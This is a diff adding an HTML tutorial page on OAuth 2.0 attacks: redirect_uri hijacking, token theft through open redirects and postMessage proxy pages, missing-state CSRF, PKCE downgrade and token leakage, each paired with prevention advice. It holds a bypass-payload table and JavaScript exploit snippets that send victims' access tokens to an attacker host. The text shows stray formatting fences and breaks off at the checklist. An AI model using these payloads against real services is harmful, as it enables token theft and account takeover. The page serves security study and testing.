@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="learn">
+  <meta id="theme-color-meta" name="theme-color" content="#0a0a0c">
+  <title>OAuth 2.0 Attacks — abdullah-learn</title>
+  <link rel="apple-touch-icon" href="/assets/icon-180.png">
+  <link rel="icon" href="/assets/icon.svg" type="image/svg+xml">
+  <link rel="manifest" href="/assets/manifest.webmanifest">
+  <script>
+    (function(){
+      var s=localStorage.getItem('theme'),
+          p=window.matchMedia('(prefers-color-scheme:light)').matches?'light':'dark',
+          t=s||p,
+          d=document.documentElement;
+      if(s)d.setAttribute('data-theme',s);
+      d.classList.add('theme-'+t);
+      d.style.backgroundColor=t==='light'?'#f7f5ef':'#0a0a0c';
+      document.getElementById('theme-color-meta').setAttribute('content',t==='light'?'#f7f5ef':'#0a0a0c');
+    })();
+  </script>
+  <link rel="stylesheet" href="/assets/shared.css?v=4">
+  <style>
+    :root{--accent:#f5b544;--accent-filter:brightness(0) saturate(100%) invert(75%) sepia(60%) saturate(500%) hue-rotate(5deg) brightness(102%) contrast(97%);--tap:44px}
+
+```
+.hero-badge{background:var(--accent);color:#000;font-family:var(--font-mono);font-size:.75rem;font-weight:700;padding:.25rem .75rem;border-radius:999px;text-transform:uppercase;letter-spacing:.06em;display:inline-block}
+
+/* ── scenario boxes ── */
+.scenario{border-radius:12px;padding:1.25rem;margin:1.5rem 0;border:1px solid var(--border)}
+.scenario--normal{background:color-mix(in srgb,#22c55e 8%,var(--bg-card));border-color:color-mix(in srgb,#22c55e 25%,var(--border))}
+.scenario--attack{background:color-mix(in srgb,#ef4444 8%,var(--bg-card));border-color:color-mix(in srgb,#ef4444 25%,var(--border))}
+.scenario--reallife{background:color-mix(in srgb,var(--accent) 8%,var(--bg-card));border-color:color-mix(in srgb,var(--accent) 25%,var(--border))}
+.scenario__label{font-family:var(--font-mono);font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:.5rem;display:flex;align-items:center;gap:.4rem}
+.scenario--normal .scenario__label{color:#22c55e}
+.scenario--attack .scenario__label{color:#ef4444}
+.scenario--reallife .scenario__label{color:var(--accent)}
+.scenario__label::before{content:'';width:8px;height:8px;border-radius:50%;background:currentColor;flex-shrink:0}
+
+/* ── section cards ── */
+.section-card{border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:2rem 0;background:var(--bg-card)}
+.section-card h2{font-family:var(--font-display);font-size:1.5rem;margin:0 0 .25rem;color:var(--fg)}
+.section-card .subtitle{font-family:var(--font-mono);font-size:.7rem;color:var(--fg-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:1rem}
+
+/* ── flow diagrams ── */
+.flow{background:var(--bg-raised);border:1px solid var(--border);border-radius:8px;padding:1rem;overflow-x:auto;margin:1rem 0;font-family:var(--font-mono);font-size:.78rem;line-height:1.6;color:var(--fg-muted);white-space:pre}
+
+/* ── pills ── */
+.pill-row{display:flex;flex-wrap:wrap;gap:.5rem;margin:.75rem 0}
+.pill{font-family:var(--font-mono);font-size:.72rem;padding:.3rem .7rem;border-radius:999px;border:1px solid var(--border-strong);color:var(--fg-muted);background:var(--bg-raised)}
+.pill--red{border-color:color-mix(in srgb,#ef4444 40%,var(--border));color:#ef4444}
+.pill--green{border-color:color-mix(in srgb,#22c55e 40%,var(--border));color:#22c55e}
+
+/* ── hunt checklist ── */
+.hunt-step{display:flex;gap:.75rem;padding:.75rem 0;border-bottom:1px solid var(--border);align-items:flex-start}
+.hunt-step:last-child{border-bottom:none}
+.hunt-num{font-family:var(--font-mono);font-size:.75rem;font-weight:700;color:var(--accent);min-width:1.5rem;padding-top:2px}
+.hunt-text{font-size:.9rem;color:var(--fg);line-height:1.5}
+
+/* ── sticky nav ── */
+.sticky-nav{position:sticky;top:env(safe-area-inset-top,0);z-index:100;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);padding:.75rem 1rem;overflow-x:auto;display:flex;gap:.5rem;border-bottom:1px solid var(--border);-webkit-overflow-scrolling:touch}
+.nav-chip{font-family:var(--font-mono);font-size:.72rem;padding:.4rem .9rem;border-radius:999px;border:1px solid var(--border);color:var(--fg-muted);background:var(--bg-raised);white-space:nowrap;text-decoration:none;min-height:var(--tap);display:flex;align-items:center;cursor:pointer;transition:background .15s,border-color .15s}
+.nav-chip:hover,.nav-chip.active{background:color-mix(in srgb,var(--accent) 14%,var(--bg));border-color:color-mix(in srgb,var(--accent) 40%,var(--border));color:var(--fg);filter:var(--accent-filter)}
+
+/* ── callout ── */
+.callout{border-left:3px solid var(--accent);padding:.75rem 1rem;margin:1.25rem 0;background:color-mix(in srgb,var(--accent) 6%,var(--bg-card));border-radius:0 8px 8px 0}
+.callout p{margin:0;font-size:.9rem;line-height:1.5;color:var(--fg)}
+.callout strong{color:var(--accent)}
+
+/* ── role grid ── */
+.role-grid{display:grid;grid-template-columns:1fr 1fr;gap:.75rem;margin:1rem 0}
+@media(max-width:480px){.role-grid{grid-template-columns:1fr}}
+.role-card{background:var(--bg-raised);border:1px solid var(--border);border-radius:10px;padding:1rem}
+.role-card h4{font-family:var(--font-mono);font-size:.78rem;font-weight:700;margin:0 0 .35rem;color:var(--accent);text-transform:uppercase;letter-spacing:.04em}
+.role-card p{margin:0;font-size:.85rem;color:var(--fg-muted);line-height:1.45}
+
+/* ── flow comparison table ── */
+.flow-table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.82rem}
+.flow-table th{font-family:var(--font-mono);font-size:.7rem;text-transform:uppercase;letter-spacing:.04em;color:var(--fg-muted);text-align:left;padding:.5rem .6rem;border-bottom:2px solid var(--border-strong);white-space:nowrap}
+.flow-table td{padding:.5rem .6rem;border-bottom:1px solid var(--border);color:var(--fg);vertical-align:top}
+.flow-table tr:last-child td{border-bottom:none}
+.deprecated{color:#ef4444;font-weight:700;font-family:var(--font-mono);font-size:.7rem}
+.recommended{color:#22c55e;font-weight:700;font-family:var(--font-mono);font-size:.7rem}
+
+/* ── page layout ── */
+.page-body{max-width:720px;margin:0 auto;padding:1.5rem 1rem calc(env(safe-area-inset-bottom,0) + 2rem)}
+.page-header{margin-bottom:2rem}
+.page-header h1{font-family:var(--font-display);font-size:2rem;line-height:1.15;margin:.5rem 0 .5rem;color:var(--fg)}
+.page-header .lead{font-size:.95rem;color:var(--fg-muted);line-height:1.5;margin:0}
+.meta{display:flex;flex-wrap:wrap;gap:.5rem;margin-top:.75rem;font-family:var(--font-mono);font-size:.7rem;color:var(--fg-subtle)}
+.divider{border:none;border-top:1px solid var(--border);margin:2.5rem 0}
+
+/* ── bypass table ── */
+.bypass-table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.82rem}
+.bypass-table th{font-family:var(--font-mono);font-size:.7rem;text-transform:uppercase;letter-spacing:.04em;color:var(--fg-muted);text-align:left;padding:.5rem;border-bottom:2px solid var(--border-strong)}
+.bypass-table td{padding:.5rem;border-bottom:1px solid var(--border);color:var(--fg);vertical-align:top;font-family:var(--font-mono);font-size:.78rem;word-break:break-all}
+.bypass-table tr:last-child td{border-bottom:none}
+
+/* ── part header ── */
+.part-header{margin:2.5rem 0 .5rem}
+.part-header h2{font-family:var(--font-display);font-size:1.75rem;color:var(--fg);margin:0 0 .35rem}
+.part-header p{color:var(--fg-muted);margin:0;font-size:.9rem;line-height:1.5}
+
+/* ── tags ── */
+.tags{display:flex;flex-wrap:wrap;gap:.4rem;margin-top:1.5rem}
+.tag{font-family:var(--font-mono);font-size:.68rem;padding:.25rem .6rem;border-radius:999px;border:1px solid var(--border);color:var(--fg-subtle);text-decoration:none;min-height:var(--tap);display:flex;align-items:center}
+```
+
+  </style>
+</head>
+<body style="padding:env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left)">
+
+  <nav class="sticky-nav" aria-label="Page sections">
+    <a href="#technology" class="nav-chip">technology</a>
+    <a href="#flows" class="nav-chip">flows</a>
+    <a href="#redirect-uri" class="nav-chip">redirect_uri</a>
+    <a href="#open-redirect" class="nav-chip">open redirect</a>
+    <a href="#proxy-page" class="nav-chip">postMessage</a>
+    <a href="#state-csrf" class="nav-chip">state CSRF</a>
+    <a href="#pkce-bypass" class="nav-chip">PKCE bypass</a>
+    <a href="#token-leakage" class="nav-chip">token leakage</a>
+    <a href="#hunt" class="nav-chip">hunt</a>
+  </nav>
+
+  <main class="page-body">
+    <header class="page-header">
+      <span class="hero-badge">auth</span>
+      <h1>OAuth 2.0 Attacks</h1>
+      <p class="lead">How delegated authorization works, why every handoff is a trust assumption, and how to break each one.</p>
+      <div class="meta">
+        <span>6 attack patterns</span>
+        <span>·</span>
+        <span>RFC 6749 / 7636 / 9700</span>
+      </div>
+    </header>
+
+```
+<nav class="toc"></nav>
+
+<!-- ════════════════════════════════════════════ -->
+<!--  PART 1 — THE TECHNOLOGY                    -->
+<!-- ════════════════════════════════════════════ -->
+<section class="section-card" id="technology">
+  <h2>The Technology</h2>
+  <div class="subtitle">What OAuth 2.0 actually is — and isn't</div>
+
+  <p>OAuth 2.0 is an <strong>authorization</strong> framework defined in RFC 6749. It lets a user grant a third-party app limited access to their resources on another service — without sharing their password. It's the mechanism behind "Sign in with Google," enterprise SSO, and every "Connect your account" button.</p>
+
+  <div class="callout">
+    <p><strong>OAuth ≠ authentication.</strong> OAuth handles authorization (who can access what). OpenID Connect (OIDC) is the authentication layer built on top. When you see <code>id_token</code>, <code>openid</code> scope, or <code>/userinfo</code>, that's OIDC extending OAuth — not OAuth itself.</p>
+  </div>
+
+  <p>Instead of sharing passwords, OAuth introduces <strong>tokens</strong> — short-lived, scoped credentials that represent specific permissions. The user authenticates with the authorization server directly; the client app never sees their password.</p>
+
+  <h3>The Four Roles</h3>
+  <div class="role-grid">
+    <div class="role-card">
+      <h4>Resource Owner</h4>
+      <p>The user. Owns the data and grants access. The person clicking "Approve" on the consent screen.</p>
+    </div>
+    <div class="role-card">
+      <h4>Client</h4>
+      <p>The app requesting access. <strong>Confidential</strong> = backend server (can keep secrets). <strong>Public</strong> = SPA/mobile (cannot keep secrets).</p>
+    </div>
+    <div class="role-card">
+      <h4>Authorization Server</h4>
+      <p>Authenticates the user, gets consent, issues tokens. Validates <code>redirect_uri</code>, <code>client_id</code>, <code>scope</code>. The gatekeeper.</p>
+    </div>
+    <div class="role-card">
+      <h4>Resource Server</h4>
+      <p>The API holding protected data. Validates the access token on every request before serving resources.</p>
+    </div>
+  </div>
+
+  <h3>Key Parameters</h3>
+  <p><code>client_id</code> — identifies the registered app. <code>redirect_uri</code> — where the auth server sends the code/token after consent. <code>response_type</code> — what the client wants back (<code>code</code> or <code>token</code>). <code>scope</code> — what permissions are being requested. <code>state</code> — CSRF protection token. <code>code_challenge</code> / <code>code_verifier</code> — PKCE parameters for public clients.</p>
+
+  <h3>The Core Handoff</h3>
+  <div class="flow">User ──(1) "Login with Social"──▸ Client App
+```
+
+│
+▼
+Client ──(2) redirect──▸ Authorization Server
+│  /auth?client_id=X&redirect_uri=callback
+│  &response_type=code&scope=openid profile
+│  &state=random123
+▼
+User authenticates + consents on auth server
+│
+▼
+Auth Server ──(3) 302 redirect──▸ /callback?code=ABC&state=random123
+│
+▼
+Client ──(4) POST /token──▸ Auth Server  [back-channel]
+│  sends: code + client_id + client_secret
+▼
+Auth Server returns: access_token (+ refresh_token)
+│
+▼
+Client ──(5) API call──▸ Resource Server
+│  Authorization: Bearer access_token
+▼
+Protected resource ✓</div>
+
+```
+  <p>Every arrow is a trust assumption. Every trust assumption is an attack surface. The security of OAuth depends entirely on the <em>implementation</em> — the spec gives flexibility, and that flexibility is where vulnerabilities live.</p>
+</section>
+
+<!-- ════════════════════════════════════════════ -->
+<!--  FLOWS COMPARISON                           -->
+<!-- ════════════════════════════════════════════ -->
+<section class="section-card" id="flows">
+  <h2>Grant Types (Flows)</h2>
+  <div class="subtitle">Which flow, when, and what's deprecated</div>
+
+  <table class="flow-table">
+    <thead>
+      <tr><th>Flow</th><th>Token delivery</th><th>Use case</th><th>Status</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Authorization Code</strong></td>
+        <td>Code in query → exchanged via back-channel</td>
+        <td>Server-side web apps</td>
+        <td><span class="recommended">✓ standard</span></td>
+      </tr>
+      <tr>
+        <td><strong>Auth Code + PKCE</strong></td>
+        <td>Same + <code>code_verifier</code> / <code>code_challenge</code></td>
+        <td>SPAs, mobile, native apps</td>
+        <td><span class="recommended">✓ mandatory in 2.1</span></td>
+      </tr>
+      <tr>
+        <td><strong>Implicit</strong></td>
+        <td>Token in URL <strong>fragment</strong> (<code>#access_token=</code>)</td>
+        <td>Legacy SPAs</td>
+        <td><span class="deprecated">✗ deprecated</span></td>
+      </tr>
+      <tr>
+        <td><strong>Client Credentials</strong></td>
+        <td>Direct exchange — no user</td>
+        <td>Machine-to-machine</td>
+        <td><span class="recommended">✓ M2M specific</span></td>
+      </tr>
+      <tr>
+        <td><strong>Password (ROPC)</strong></td>
+        <td>User gives password to the client</td>
+        <td>Legacy migration only</td>
+        <td><span class="deprecated">✗ deprecated</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>PKCE — Proof Key for Code Exchange</h3>
+  <p>Public clients can't store a <code>client_secret</code>. Without PKCE, anyone who intercepts the authorization code can exchange it for a token. PKCE adds a challenge-response that binds the code to the client that requested it:</p>
+
+  <div class="flow">Client generates:
+```
+
+code_verifier  = crypto_random (43-128 chars)
+code_challenge = BASE64URL(SHA256(code_verifier))
+
+Auth request includes:
+/auth?…&code_challenge=XYZ&code_challenge_method=S256
+
+Token exchange includes:
+POST /token → code=ABC & code_verifier=original_secret
+
+Server verifies:
+SHA256(code_verifier) === stored code_challenge
+✓ match → issue token
+✗ mismatch → reject</div>
+
+```
+  <p>Even if an attacker steals the code, they don't have the <code>code_verifier</code>, so the exchange fails. OAuth 2.1 makes PKCE mandatory for all clients — confidential and public.</p>
+
+  <h3>Implicit Flow — Why It's Dangerous</h3>
+
+  <div class="scenario scenario--attack">
+    <div class="scenario__label">Risk surface</div>
+    <p>The token goes directly into the URL fragment. Fragments are visible in browser history, leakable via <code>Referer</code> headers when the page loads external resources, extractable via XSS on the callback page, and — critically — <strong>they survive HTTP 302 redirects</strong>. This means an open redirect anywhere on the client domain can carry the token off-site. There's no back-channel exchange, no server-side validation, and no refresh tokens. OAuth 2.1 formally removes this flow.</p>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════════════════════════════════════════ -->
+<!--  PART 2 — THE VULNERABILITIES               -->
+<!-- ════════════════════════════════════════════ -->
+<div class="part-header">
+  <h2>The Vulnerabilities</h2>
+  <p>Six attack patterns — each exploits a missing or weak trust check in the OAuth handoff chain.</p>
+</div>
+
+<!-- VULN 1 -->
+<section class="section-card" id="redirect-uri">
+  <h2>1 — redirect_uri Hijack</h2>
+  <div class="subtitle">No validation → direct code/token theft</div>
+
+  <div class="scenario scenario--normal">
+    <div class="scenario__label">Normal flow</div>
+    <p>The <code>redirect_uri</code> tells the auth server where to send the code after consent. The server validates it against a pre-registered whitelist before redirecting. Only exact matches should pass.</p>
+  </div>
+
+  <div class="scenario scenario--reallife">
+    <div class="scenario__label">Restaurant analogy</div>
+    <p>You hand the valet your keys with a note: <em>"return my car to Hotel A's front door."</em> The valet should check their approved list. If they deliver to whatever address the note says — the thief just writes their own address.</p>
+  </div>
+
+  <div class="scenario scenario--attack">
+    <div class="scenario__label">Attack</div>
+    <p>The auth server doesn't validate <code>redirect_uri</code>. Attacker swaps it to their own domain. Victim clicks the link — their authorization code gets delivered to the attacker. Attacker replays the code on the real callback.</p>
+  </div>
+
+  <div class="flow">Victim clicks malicious link
+```
+
+▼
+Auth Server: redirect_uri=https://attacker.com
+│  no validation ✗
+▼
+302 → https://attacker.com/?code=STOLEN
+│
+Attacker replays: GET /callback?code=STOLEN
+▼
+Logged in as victim ✓</div>
+
+```
+  <h3>redirect_uri Bypass Techniques</h3>
+  <p>When validation exists but isn't exact-match, try these in Repeater — escalating from simple to complex:</p>
+
+  <table class="bypass-table">
+    <thead><tr><th>Technique</th><th>Payload</th></tr></thead>
+    <tbody>
+      <tr><td>Full swap</td><td>redirect_uri=https://attacker.com</td></tr>
+      <tr><td>Subdomain spoof</td><td>redirect_uri=https://evil.legit.com/cb</td></tr>
+      <tr><td>Suffix bypass</td><td>redirect_uri=https://legit.com.attacker.com</td></tr>
+      <tr><td>Path traversal</td><td>redirect_uri=https://legit.com/cb/../other</td></tr>
+      <tr><td>Query injection</td><td>redirect_uri=https://legit.com/cb?x=evil</td></tr>
+      <tr><td>Fragment</td><td>redirect_uri=https://legit.com/cb#@evil</td></tr>
+      <tr><td>URL encoding</td><td>redirect_uri=https://legit.com/%2e%2e/evil</td></tr>
+      <tr><td>Double encoding</td><td>redirect_uri=https://legit.com%252f%252e%252e</td></tr>
+      <tr><td>Param pollution</td><td>redirect_uri=legit&redirect_uri=evil</td></tr>
+      <tr><td>@ character</td><td>redirect_uri=https://legit.com@attacker.com</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout">
+    <p><strong>Real-world note:</strong> A 2023 ACM study tested 20 path-confusion payloads against major identity providers and found multiple accepted path traversal and encoding bypasses. A 2026 Keycloak CVE (CVE-2026-3872) was a <code>..;/</code> traversal bypass in the OIDC auth endpoint. This attack surface is alive and active.</p>
+  </div>
+
+  <h3>Weakness</h3>
+  <div class="pill-row">
+    <span class="pill pill--red">no redirect_uri validation</span>
+    <span class="pill pill--red">prefix/regex/substring matching</span>
+    <span class="pill pill--red">no path normalization</span>
+  </div>
+  <h3>Prevention</h3>
+  <div class="pill-row">
+    <span class="pill pill--green">exact string match only</span>
+    <span class="pill pill--green">normalize paths before compare</span>
+    <span class="pill pill--green">require redirect_uri on /token exchange</span>
+    <span class="pill pill--green">never sanitize — validate then reject</span>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- VULN 2 -->
+<section class="section-card" id="open-redirect">
+  <h2>2 — Token Theft via Open Redirect</h2>
+  <div class="subtitle">Chaining prefix bypass + open redirect to leak fragment tokens</div>
+
+  <div class="scenario scenario--normal">
+    <div class="scenario__label">Normal flow (implicit grant)</div>
+    <p>With <code>response_type=token</code>, the access token lands in the URL fragment (<code>#access_token=...</code>). Fragments never leave the browser in HTTP requests — only client-side JS can read them. The callback page extracts and uses the token.</p>
+  </div>
+
+  <div class="callout">
+    <p><strong>Key insight:</strong> URL fragments survive HTTP 302 redirects in most browsers. If you redirect the user after the token lands in the fragment, the fragment follows to the new destination.</p>
+  </div>
+
+  <div class="scenario scenario--reallife">
+    <div class="scenario__label">Restaurant analogy</div>
+    <p>The valet is stricter: <em>"I only deliver to Hotel A."</em> But Hotel A has a shuttle that'll take you anywhere. The valet drops the car at Hotel A (valid address). The shuttle immediately drives it to the attacker.</p>
+  </div>
+
+  <div class="scenario scenario--attack">
+    <div class="scenario__label">Attack — two flaws chained</div>
+    <p><strong>Flaw 1:</strong> The auth server does prefix-match on <code>redirect_uri</code> — accepts anything starting with the registered callback path, including traversal (<code>/callback/../post/next</code>). <strong>Flaw 2:</strong> The client has an open redirect (<code>/post/next?path=...</code>). The attacker's two-stage script: first visit triggers OAuth, second visit (with fragment) converts it to a query parameter for exfiltration.</p>
+  </div>
+
+  <div class="flow">Exploit page (no hash) → script redirects to:
+```
+
+/auth?redirect_uri=target/callback/../post/next?path=attacker
+│  prefix validates ✓
+▼
+target/post/next?path=attacker#access_token=TOKEN
+│  open redirect fires, fragment preserved
+▼
+attacker/exploit#access_token=TOKEN
+│  script reads hash → redirects to
+▼
+attacker/?access_token=TOKEN  ← access log ✓</div>
+
+```
+  <pre><code class="language-html">&lt;script&gt;
+```
+
+if (!document.location.hash) {
+window.location = ‘https://auth-server/auth?client_id=ID’
++ ‘&redirect_uri=https://target/callback/../post/next’
++ ‘%3fpath%3dhttps://attacker/exploit’
++ ‘&response_type=token&scope=openid profile email’
+} else {
+window.location = ‘/?’ + document.location.hash.substr(1)
+}
+</script></code></pre>
+
+```
+  <div class="callout">
+    <p><strong>Encoding gotcha:</strong> The <code>?</code> and <code>=</code> inside <code>redirect_uri</code> must be URL-encoded (<code>%3f</code>, <code>%3d</code>) so the auth server doesn't parse them as separate OAuth params.</p>
+  </div>
+
+  <h3>Weakness</h3>
+  <div class="pill-row">
+    <span class="pill pill--red">prefix-match redirect_uri</span>
+    <span class="pill pill--red">no path normalization</span>
+    <span class="pill pill--red">open redirect on client domain</span>
+    <span class="pill pill--red">implicit flow (fragments)</span>
+  </div>
+  <h3>Prevention</h3>
+  <div class="pill-row">
+    <span class="pill pill--green">exact-match redirect_uri</span>
+    <span class="pill pill--green">kill open redirects</span>
+    <span class="pill pill--green">use auth code + PKCE</span>
+    <span class="pill pill--green">normalize before compare</span>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- VULN 3 -->
+<section class="section-card" id="proxy-page">
+  <h2>3 — Token Theft via Proxy Page</h2>
+  <div class="subtitle">Abusing postMessage with wildcard target origin</div>
+
+  <div class="scenario scenario--normal">
+    <div class="scenario__label">Normal flow</div>
+    <p>Some apps use <code>window.postMessage</code> to pass OAuth data between windows — an iframe handles the callback and sends the token to its parent. The second argument to <code>postMessage</code> specifies which origin can receive the message. This is sometimes called the "web message response mode."</p>
+  </div>
+
+  <pre><code class="language-javascript">// Dangerous — any parent receives this
+```
+
+window.parent.postMessage(data, ‘*’);
+
+// Safe — locked to the expected origin
+window.parent.postMessage(data, ‘https://trusted-app.com’);</code></pre>
+
+```
+  <div class="scenario scenario--reallife">
+    <div class="scenario__label">Restaurant analogy</div>
+    <p>The delivery driver is told: <em>"shout the package contents when you arrive at Hotel A."</em> They shout to whoever is listening. Attacker parks a van in the lot with a microphone.</p>
+  </div>
+
+  <div class="scenario scenario--attack">
+    <div class="scenario__label">Attack</div>
+    <p>The <code>redirect_uri</code> is locked down. No open redirect. But a page on the client (e.g., a comment form) calls <code>postMessage(data, '*')</code>. Attacker embeds the OAuth flow in an iframe. The iframe's parent is the attacker's page — so <code>postMessage</code> delivers the token to attacker JS.</p>
+  </div>
+
+  <div class="flow">┌──────────────────────────────────────┐
+```
+
+│  Attacker exploit page                │
+│  ┌────────────────────────────────┐  │
+│  │  iframe: OAuth → proxy page    │  │
+│  │  → postMessage(data, ‘*’)      │  │
+│  └──────────┬─────────────────────┘  │
+│             │ message event           │
+│             ▼                         │
+│  window.addEventListener(‘message’)   │
+│  fetch(’/?t=’ + JSON.stringify(e.data))│
+└──────────────────────────────────────┘</div>
+
+```
+  <pre><code class="language-html">&lt;iframe src="https://auth-server/auth?client_id=ID
+```
+
+&redirect_uri=https://target/callback/../proxy-page
+&response_type=token&scope=openid profile email”>
+</iframe>
+<script>
+window.addEventListener(‘message’, function(e) {
+fetch(’/?t=’ + encodeURIComponent(
+JSON.stringify(e.data)
+))
+}, false)
+</script></code></pre>
+
+```
+  <div class="callout">
+    <p><strong>Gotcha:</strong> <code>e.data</code> may be an object, not a string. <code>encodeURIComponent(e.data)</code> gives <code>[object Object]</code>. Always wrap with <code>JSON.stringify()</code>.</p>
+  </div>
+
+  <h3>Weakness</h3>
+  <div class="pill-row">
+    <span class="pill pill--red">postMessage with '*'</span>
+    <span class="pill pill--red">no event.origin check</span>
+    <span class="pill pill--red">embeddable in attacker iframe</span>
+  </div>
+  <h3>Prevention</h3>
+  <div class="pill-row">
+    <span class="pill pill--green">specify exact target origin</span>
+    <span class="pill pill--green">validate event.origin on receiver</span>
+    <span class="pill pill--green">CSP frame-ancestors</span>
+    <span class="pill pill--green">X-Frame-Options</span>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- VULN 4 -->
+<section class="section-card" id="state-csrf">
+  <h2>4 — Missing State = OAuth CSRF</h2>
+  <div class="subtitle">Forcing account linking without user consent</div>
+
+  <div class="scenario scenario--normal">
+    <div class="scenario__label">Normal flow</div>
+    <p>The <code>state</code> parameter is OAuth's CSRF token. The client generates a crypto-random value, stores it in the session, sends it in the auth request, and verifies it matches on the callback. This ensures the callback corresponds to a request the user initiated — not an attacker's forged link.</p>
+  </div>
+
+  <div class="scenario scenario--attack">
+    <div class="scenario__label">Attack — login CSRF</div>
+    <p>If <code>state</code> is missing or not validated, the attacker starts an OAuth flow with <strong>their own</strong> account, captures the callback URL with the code, then tricks the victim into loading it. The victim's session gets linked to the attacker's OAuth identity. The attacker now logs in with their OAuth creds and gets the victim's account.</p>
+  </div>
+
+  <div class="flow">Attacker starts OAuth → approves with THEIR account
+```
+
+│  intercepts: /callback?code=ATTACKER_CODE
+▼
+Sends URL to victim (img tag, iframe, link)
+│
+▼
+Victim’s browser: GET /callback?code=ATTACKER_CODE
+│  no state check ✗
+▼
+Client links attacker’s OAuth identity → victim’s session
+▼
+Attacker logs in with their OAuth creds → victim’s account ✓</div>
+
+```
+  <h3>Weakness</h3>
+  <div class="pill-row">
+    <span class="pill pill--red">missing state parameter</span>
+    <span class="pill pill--red">static / predictable state</span>
+    <span class="pill pill--red">state not bound to session</span>
+  </div>
+  <h3>Prevention</h3>
+  <div class="pill-row">
+    <span class="pill pill--green">crypto random state per request</span>
+    <span class="pill pill--green">bind state to user session</span>
+    <span class="pill pill--green">strict match on callback</span>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- VULN 5 -->
+<section class="section-card" id="pkce-bypass">
+  <h2>5 — PKCE Downgrade / Bypass</h2>
+  <div class="subtitle">When the server treats PKCE as optional</div>
+
+  <div class="scenario scenario--normal">
+    <div class="scenario__label">Normal flow</div>
+    <p>PKCE binds the authorization code to the client that requested it via a <code>code_challenge</code> / <code>code_verifier</code> pair. The auth server stores the challenge, and the token endpoint verifies <code>SHA256(verifier) == challenge</code> before issuing tokens.</p>
+  </div>
+
+  <div class="scenario scenario--attack">
+    <div class="scenario__label">Attack — PKCE downgrade</div>
+    <p>The server <em>supports</em> PKCE but doesn't <em>enforce</em> it. Attacker strips <code>code_challenge</code> and <code>code_challenge_method</code> from the auth request. Server issues a code anyway. Attacker exchanges the stolen code at <code>/token</code> without any <code>code_verifier</code> — token returned.</p>
+  </div>
+
+  <div class="flow">Burp Repeater test:
+```
+
+1. Capture: GET /auth?…&code_challenge=XYZ&code_challenge_method=S256
+1. Strip both PKCE params → send
+1. Server returns code? → PKCE optional (vuln ✗)
+1. POST /token with code, NO code_verifier
+1. Token returned? → full bypass confirmed ✗
+
+Also test:
+
+- code_challenge_method=plain (challenge = verifier)
+- Replay code_verifier from a different session</div>
+  
+  ```
+  <h3>Weakness</h3>
+  <div class="pill-row">
+    <span class="pill pill--red">PKCE optional not enforced</span>
+    <span class="pill pill--red">plain method accepted</span>
+    <span class="pill pill--red">no verifier check on /token</span>
+  </div>
+  <h3>Prevention</h3>
+  <div class="pill-row">
+    <span class="pill pill--green">require PKCE for all clients</span>
+    <span class="pill pill--green">enforce S256 only</span>
+    <span class="pill pill--green">reject /token without valid verifier</span>
+  </div>
+  ```
+  
+    </section>
+  
+    <hr class="divider">
+  
+    <!-- VULN 6 -->
+  
+    <section class="section-card" id="token-leakage">
+      <h2>6 — Token Leakage via Referer & Storage</h2>
+      <div class="subtitle">Tokens escaping through side channels</div>
+  
+  ```
+  <div class="scenario scenario--attack">
+    <div class="scenario__label">Leakage vectors</div>
+    <p>Tokens and codes can escape through channels developers overlook — even when the primary OAuth flow is correctly implemented.</p>
+  </div>
+  
+  <p><strong>Referer header.</strong> The callback page loads external resources (analytics, fonts, CDN scripts). The browser sends the current URL — including <code>?code=ABC</code> in the query string — in the <code>Referer</code> header to every external domain.</p>
+  
+  <p><strong>Browser history.</strong> Implicit flow tokens in fragments and auth codes in query strings are recorded in history. Shared devices, browser sync, and shoulder surfing become attack vectors.</p>
+  
+  <p><strong>Server logs.</strong> Query-string params are logged by web servers, reverse proxies, CDNs, and WAFs by default. Auth codes sitting in access logs are visible to anyone with log access.</p>
+  
+  <p><strong>Insecure storage.</strong> Tokens in <code>localStorage</code> are accessible to any JS on the page — one XSS and the token is exfiltrated. Tokens in non-<code>HttpOnly</code> cookies are similarly exposed. Backend session storage with <code>HttpOnly</code> + <code>Secure</code> + <code>SameSite</code> cookies is the recommended pattern.</p>
+  
+  <h3>Weakness</h3>
+  <div class="pill-row">
+    <span class="pill pill--red">tokens in URL query/fragment</span>
+    <span class="pill pill--red">external resources on callback</span>
+    <span class="pill pill--red">localStorage token storage</span>
+    <span class="pill pill--red">missing Referrer-Policy</span>
+  </div>
+  <h3>Prevention</h3>
+  <div class="pill-row">
+    <span class="pill pill--green">Referrer-Policy: no-referrer</span>
+    <span class="pill pill--green">no external resources on callback</span>
+    <span class="pill pill--green">HttpOnly Secure SameSite cookies</span>
+    <span class="pill pill--green">short-lived single-use codes</span>
+    <span class="pill pill--green">response_mode=form_post</span>
+  </div>
+  ```
+  
+    </section>
+  
+    <hr class="divider">
+  
+    <!-- ════════════════════════════════════════════ -->
+  
+    <!--  HUNT CHECKLIST                             -->
+  
+    <!-- ════════════════════════════════════════════ -->
+  
+    <section class="section-card" id="hunt">
+      <h2>Hunt Checklist</h2>
+      <div class="subtitle">Systematic testing order for engagements</div>
+  
+  ```
+  <div class="hunt-step">
+    <span class="hunt-num">01</span>
